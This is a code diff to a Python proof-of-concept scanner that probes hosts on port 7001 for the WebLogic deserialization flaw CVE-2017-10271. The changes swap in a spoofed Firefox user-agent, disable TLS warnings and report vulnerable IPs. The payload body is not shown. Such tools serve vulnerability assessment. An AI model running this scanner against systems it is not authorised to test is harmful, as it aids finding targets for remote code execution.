@@ -16,9 +16,9 @@ from lib import *
 
 
 VUL=['CVE-2017-10271']
-headers = {'user-agent': 'ceshi/0.0.1'}
+headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:49.0) Gecko/20100101 Firefox/49.0"}
 
-def poc(url,index):
+def poc(url,index,rip):
     rurl=url
     if not url.startswith("http"):
         url = "http://" + url
@@ -48,6 +48,7 @@ def poc(url,index):
     '''
 
     try:
+        requests.packages.urllib3.disable_warnings()
         response = requests.post(url, data=post_str, verify=False, timeout=5, headers=headers)
         response = response.text
         response = re.search(r"\<faultstring\>.*\<\/faultstring\>", response).group(0)
@@ -55,13 +56,16 @@ def poc(url,index):
         response = ""
 
     if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
-        print(Vcolors.RED+ '\t检测JAVA deserialization漏洞(CVE-2017-10271)\n\t'+Vcolors.ENDC)
-        a = url+":7001:检测JAVA deserialization漏洞(CVE-2017-10271)"
+        print(Vcolors.RED+ rip+'\t检测存在JAVA deserialization漏洞(CVE-2017-10271)'+Vcolors.ENDC)
+        a = rip+":7001:检测存在JAVA deserialization漏洞(CVE-2017-10271)"
         return a
     else:
         pass
 
 
 def run(rip,rport,index):
-    url=rip+':'+str(rport)
-    poc(url=url,index=index)
+    try:
+        url=rip+':'+str(rport)
+        return poc(url,index,rip)
+    except:
+        pass
